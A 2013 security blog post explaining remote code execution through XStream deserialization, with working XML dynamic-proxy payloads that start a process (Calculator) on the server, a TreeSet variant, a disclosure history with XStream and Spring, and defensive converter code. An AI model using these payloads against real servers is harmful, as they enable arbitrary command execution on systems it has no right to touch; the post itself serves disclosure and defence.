+++
author = "pwntester"
categories = ["Java", "Exploit", "RCE", "XStream"]
date = 2013-12-23T10:15:00Z
description = ""
draft = false
slug = "rce-via-xstream-object-deserialization38"
tags = ["Java", "Exploit", "RCE", "XStream"]
title = "RCE via XStream object deserialization"

+++

When researching [SpringMVC RESTful APIs and their XXE vulnerabilities](http://www.pwntester.com/blog/2013/08/23/springmvc-vulnerable-to-xxe/) I found that [XStream](http://xstream.codehaus.org/index.html) was not vulnerable to XXE because it ignored the **&lt;DOCTYPE /&gt;** blocks. Curious about it I decided to took a deeper look at XStream and found out that its not just a simple marshalling library as JAXB but a much more powerful serializing library capable of serializing to an XML representation really complex types and not just POJOs. I took a look at the list of [XStream converters](http://xstream.codehaus.org/converters.html) and found the following interesting one:

![](/images/octopress/reflectionconverter.png)

As stated by the XStream documentation:

> The dynamic proxy itself is not serialized, however the interfaces it implements and the actual InvocationHandler instance are serialized. This allows the proxy to be reconstructed after deserialization.

This allow us to send an XML representation of a dynimic proxy where the InvocationHandler will be XStream serialized. The XML representation will look something like:

```lang-markup line-numbers 
 <dynamic-proxy>
  <interface>com.foo.Blah</interface>
  <interface>com.foo.Woo</interface>
  <handler class="com.foo.MyHandler">
    <something>blah</something>
  </handler>
</dynamic-proxy>
```

So for those not familiar with a dynamic proxy, lets say that is a way to intercept any call to an interface declared method so that when the method is invoked on the proxified interface we can hook the method call and inject any custom code.

![](/images/octopress/proxy.png)

The **InvocationHandler** will be the responsable to handle the intercepted call. For our exploit we will be using [java.beans.EventHandler](http://docs.oracle.com/javase/7/docs/api/java/beans/EventHandler.html) that does not implement the **Serializable** interface so we could not use it for our [CVE-2011-2894 exploit](http://www.pwntester.com/blog/2013/12/16/rce-through-deserialization-of-spring-defaultlistablebeanfactories-cve-2011-2894/) but that is serializable using XStream.

The simplest scenario is the one where the server is expecting a serialized instance that implements a given interface. Lets say that the server code looks like:

```lang-java line-numbers 
@Controller
 @RequestMapping("/contacts")
 public class ContactController {
     @Autowired
     private ContactRepository contactRepository;

     @RequestMapping( method = RequestMethod.POST )
     @ResponseStatus( HttpStatus.CREATED )
      public final String create( @RequestBody Contact contact ){
         log(”Creating new contact: " + contact.getFirstName());
         contactRepository.save(contact);
         return "OK";
     }
 }
```

So the idea is to:

* Find out what Class the XML will be deserialized to (in this case com.company.model.Contact)
* Create a proxy for that class
* Intercept/hook any call to any method in the interface
* Replace the original call with the malicious payload
* Send the serialized version of the proxy
* Cross-fingers
* Profit

So this is what our server application was expecting:

```lang-markup line-numbers 
<contact>
    <id>1</id>
    <firstName>alvaro</firstName>
    <lastName>munoz</lastName>
    <email>alvaro@pwntester.com</email>
</contact>
```

And this is what we will send in order to execute any arbitrary payload:

```lang-markup line-numbers 
<dynamic-proxy>
<interface>com.company.model.Contact</interface>
<handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
	<command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>
    </target>
    <action>start</action>
</handler>
</dynamic-proxy>
```

As you can see we are defining a **dynamic proxy** for the "com.company.model.Contact" interface and intercepting any method call on that interface with a "java.beans.EventHandler" invocation handler. This handler will replace the original method call with a call to "java.lang.ProcessBuilder.start("/Applications/Calculator.app/Contents/MacOS/Calculator")".

Convenient, isn't it?

So as soon as the server code reaches a method call on the proxified interface like the following line on our example controller:

```lang-java line-numbers 
log(”Creating new contact: " + contact.getFirstName());
```

The method call will be intercepted and replaced with our payload and the result will be a malicious calculator running on the server :)

![](/images/octopress/calc.png)

## Increasing the success likelihood
Finding out what Class the server is expecting can be difficult and we also have the limitation that the class needs to implements an interface. How many applications have you seen using interfaces for POJO DTOs?? A solution for this problem is to serialize an object that contains other objects and that in order to instantiate this object, a call to an interface method has to be made. This is where we will be able to inject our malicious code using an **InvocationHandler**. The original idea by **Jörg Schaible** (XStream developer) was proposed during the disclosure to the XStream team and can be found [here](https://www.mail-archive.com/user@xstream.codehaus.org/msg00605.html). This variant consists on serializing a [java.util.TreeSet](http://docs.oracle.com/javase/6/docs/api/java/util/TreeSet.html) containg different objects implementing the [java.lang.Comparable](http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html) interface so that when the **Set** is instantiated on the server side, the **Comparable** interface methods are called to sort the **Set**. All we have to do now is to add a dynamic proxy intercepting any method call to the **Comparable** interface and replacing it with our payload:

```lang-java line-numbers 
Set<Comparable> set = new TreeSet<Comparable>();
set.add("foo");
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("open","/Applications/Calculator.app"), "start"));
```

If we try to serialize it using XStream **toXML** it will throw a Cast exception and we wont be able to get the serialized version:

```lang-java line-numbers 
Set<Comparable> set = new TreeSet<Comparable>();
set.add("foo");
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("/Applications/Calculator.app/Contents/MacOS/Calculator"), "start"));
String payload = xstream.toXML(set);
System.out.println(payload);
```

Will throw:

```lang-bash line-numbers 
Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.lang.Integer
  at com.sun.proxy.$Proxy4.compareTo(Unknown Source)
  at java.util.TreeMap.put(TreeMap.java:560)
  at java.util.TreeSet.add(TreeSet.java:255)
  at com.pwntester.xstreampoc.Main.main(Main.java:26)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:601)
  at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
```

That will also happen during the deserialization process but at least we will be able to execute our payload.
Anyway, we will need to craft the payload by hand and we will get something like:

```lang-markup line-numbers 
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

Now, if we deserialize this XML, we will get a Cast exception and our malicious calculator running on the server:

```lang-java line-numbers 
String payload = "<sorted-set>" +
        "<string>foo</string>" +
        "<dynamic-proxy>" +
        "<interface>java.lang.Comparable</interface>" +
        "<handler class=\"java.beans.EventHandler\">" +
        " <target class=\"java.lang.ProcessBuilder\">" +
        " <command>" +
        " <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>" +
        " </command>" +
        " </target>" +
        " <action>start</action>" +
        "</handler>" +
        "</dynamic-proxy>" +
        "</sorted-set>";

Contact c = (Contact) xstream.fromXML(payload);
```

![](/images/octopress/calc.png)

You can find the whole project POC in the [XStream POC github repo](https://github.com/pwntester/XStreamPOC)

## Disclosure

I reported this issue to the XStream developers. I was wondering if there was any way to unregister the **reflection** converter by default. As you can see in this [mail thread](https://www.mail-archive.com/user@xstream.codehaus.org/msg00602.html), there was a solution. Unregistering the converter was not possible but registering a catch-all converter with higher priority than the reflection one should be possible.

As the XStream team argued, disabling it dy default was not an option since it was used by 99% of all projects using XStream:

> >> Would it be possible to not register the reflection converters by default so only users that need them do it?
> Unfortunately no. It's one of XStream's key features that you actually can
> marshal nearly any object graph out of the box. If we drop the
> ReflectionConverter as catch all, we'll break immediately ~99% of all
> existing projects using XStream.

I was ok with that since at least there was a way to "disable" it manually. But I saw no point on having the reflection converter on by default in SpringOXM when used for building RESTful webservices. RESTful APIs are about representation of entities and I see no point on serializing dynamic proxies to represent those entities. I got in contact with Spring Security Team and let them know the issue. Their response was that **XStream** should not be use for RESTFul webservices and that they wont disable the converter by default in their SpringOXM wrapper since its not only used by SpringMVC but they agreed in updating the [SpringMVC documentation](https://github.com/spring-projects/spring-framework/pull/322/files) to reflect that **XStreamMarshaller** should be used at your own risk when used to build RESTful APIs.

![](/images/octopress/springdocs.png)

## What to do about it

Ok, so what can we do as developers to avoid this? We need to:

* Register a standard priority converter for the beans you are expecting in your application
* Register a catch-all converter with higher priority than the reflection ones (low priority) and make the converter to return **null** on its **unmarshall** method so any object deserialized by the catch-all converter, will throw an exception and interrupt the converter chain before hitting the Reflection converters.

Writing a custom converter is easy and its explaind in detail on the [XStream documentation](http://xstream.codehaus.org/converter-tutorial.html). We will be creating a custom converter for the **Contact** class in the [XStream POC](https://github.com/pwntester/XStreamPOC) example presented above:

```lang-java line-numbers 
package com.pwntester.xstreampoc;

import com.thoughtworks.xstream.converters.Converter;
import com.thoughtworks.xstream.converters.MarshallingContext;
import com.thoughtworks.xstream.converters.UnmarshallingContext;
import com.thoughtworks.xstream.io.HierarchicalStreamReader;
import com.thoughtworks.xstream.io.HierarchicalStreamWriter;

public class ContactConverter implements Converter {

    public boolean canConvert(Class clazz) {
        return clazz.equals(Contact.class);
    }

    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
        Contact contact = (Contact) value;
        writer.startNode("name");
        writer.setValue(contact.getName());
        writer.endNode();
    }

    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
        Contact contact = new Contact();
        reader.moveDown();
        contact.setName(reader.getValue());
        reader.moveUp();
        return contact;
    }

}
```

For the catch-all converter, we will return **null** when unmarshalling:

```lang-java line-numbers 
package com.pwntester.xstreampoc;

import com.thoughtworks.xstream.converters.Converter;
import com.thoughtworks.xstream.converters.MarshallingContext;
import com.thoughtworks.xstream.converters.UnmarshallingContext;
import com.thoughtworks.xstream.io.HierarchicalStreamReader;
import com.thoughtworks.xstream.io.HierarchicalStreamWriter;

public class CatchAllConverter implements Converter {

    public boolean canConvert(Class clazz) {
        return true;
    }

    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext context) {
    }

    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
       return null;
    }

}
```

Ok, now before deserializing our untrusted input we have to register our new converters:

```lang-java line-numbers 
XStream xstream = new XStream(new DomDriver());
xstream.processAnnotations(Contact.class);
xstream.registerConverter(new ContactConverter());
xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);
```

We need to wrap our deserializing call within a try-catch block:

```lang-java line-numbers 
try {
        Contact expl = (Contact) xstream.fromXML(payload);
} catch (com.thoughtworks.xstream.converters.ConversionException ex) {
    System.out.println("Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter");
}
```

And that's pretty much it, lets run the application again with our malicious payload:

```lang-markup line-numbers 
<contact>
  <name>Alvaro</name>
</contact>
Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter
```

Voila!! no calculator this time!

## Further reading
- This vulnerability was presented by [Abraham Kang](http://www.linkedin.com/pub/abraham-kang/0/953/384), [Dinis Cruz](https://twitter.com/DinisCruz‎) and yours truly during the  ["RESTing On Your Laurels will Get YOu Pwned"](http://www.slideshare.net/DinisCruz/res-ting-on-your-laurels-will-get-you-powned4-3) DefCon 2013 talk
- Dinis Cruz wrote a great [follow-up post](http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html) on his blog

Thanks for reading!



